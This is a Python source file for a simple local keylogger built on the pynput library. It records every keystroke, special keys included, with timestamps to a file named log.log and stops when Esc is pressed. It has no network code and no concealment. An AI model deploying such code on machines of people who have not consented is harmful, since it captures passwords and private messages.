from pynput.keyboard import Key, Listener, Controller
from datetime import datetime

keyboard = Controller()
now = datetime.now()
f = open("log.log", "a")
#f.write("Now the file has more content!")
d = now.strftime("%d/%m/%Y %H:%M:%S")
f.write(d)
f.write(" - ")
f.close()
#c_l and c_r are for checking state on ctrl keys
#c_l=False
#c_r=False
def on_pressf(key):
#    global c_r
#    global c_l
    ff = open("log.log", "a")
    if key==Key.enter:
        ff.write("<Enter>\n")
        dt = now.strftime("%d/%m/%Y %H:%M:%S")
        ff.write(dt)
        ff.write(" - ")
    elif key == Key.esc:
        ff.write("<Esc>")
    elif key == Key.alt_gr:
        keyboard.release(Key.alt_gr)
        ff.write("<Alt>")
    elif key == Key.alt_l:
        keyboard.release(Key.alt_l)
        ff.write("<Alt>")
    elif key == Key.alt_r:
        keyboard.release(Key.alt_r)
        ff.write("<Alt>")
    elif key == Key.ctrl_l:
        keyboard.release(Key.ctrl_l)
        ff.write("<Ctrl>")
#        c_l=True
    elif key == Key.ctrl_r:
        keyboard.release(Key.ctrl_r)
        ff.write("<Ctrl>")
#        c_r=True
    elif key == Key.shift_l or key == Key.shift_r:
        ff.write("<Shift>")
    elif key == Key.space:
        ff.write(" ")
    elif key == Key.f1:
        ff.write("<F1>")
    elif key == Key.f2:
        ff.write("<F2>")
    elif key == Key.f3:
        ff.write("<F3>")
    elif key == Key.f4:
        ff.write("<F4>")
    elif key == Key.f5:
        ff.write("<F5>")
    elif key == Key.f6:
        ff.write("<F6>")
    elif key == Key.f7:
        ff.write("<F7>")
    elif key == Key.f8:
        ff.write("<F8>")
    elif key == Key.f9:
        ff.write("<F9>")
    elif key == Key.f10:
        ff.write("<F10>")
    elif key == Key.f11:
        ff.write("<F11>")
    elif key == Key.f12:
        ff.write("<F12>")
    elif key == Key.down:
       ff.write("<Down>")
    elif key == Key.left:
        ff.write("<Left>")
    elif key == Key.right:
        ff.write("<Right>")
    elif key == Key.up:
        ff.write("<Up>")
    elif key == Key.num_lock:
        ff.write("<Numlock>")
    elif key == Key.scroll_lock:
        ff.write("<Scroll Lock>")
    elif key == Key.caps_lock:
        ff.write("<Caps Lock>")
    elif key == Key.backspace:
        ff.write("<backspace>")
    elif key == Key.cmd:
        ff.write("<Window key>")
    elif key == Key.delete:
        ff.write("<Delete>")
    elif key == Key.end:
        ff.write("<End>")
    elif key == Key.home:
        ff.write("<Home>")
    elif key == Key.insert:
        ff.write("<Insert>")
    elif key == Key.tab:
        ff.write("<tab>")
    elif key == Key.menu:
        ff.write("<Menu>")
    elif ("{}".format(key)[0])=="'" and ("{}".format(key)[2])=="'":
        if ("{}".format(key)[1])=="<":
            ff.write("<<>")
        elif ("{}".format(key)[1])==">":
            ff.write("<>>")
        else:
            ff.write("{}".format(key)[1])
        #ff.write("The binary version of {0} is {0:b}".format(key)[1])
    #for unknow character
    else:
        ff.write("<UK>")
    ff.close()

def on_releasef(key2):
#    global c_l
#    global c_r
    #print('{0} release'.format(
     #   key))    
    ff = open("log.log", "a")
    if key2 == Key.esc:
        # Stop listener
        ff.write("\n")
        return False
#    elif key2 == Key.ctrl_l:
#        c_l=False
#    elif key2 == Key.ctrl_r:
#        c_r==False
    ff.close()

# Collect events until released
with Listener(
        on_press=on_pressf,
        on_release=on_releasef) as k:
    k.join()
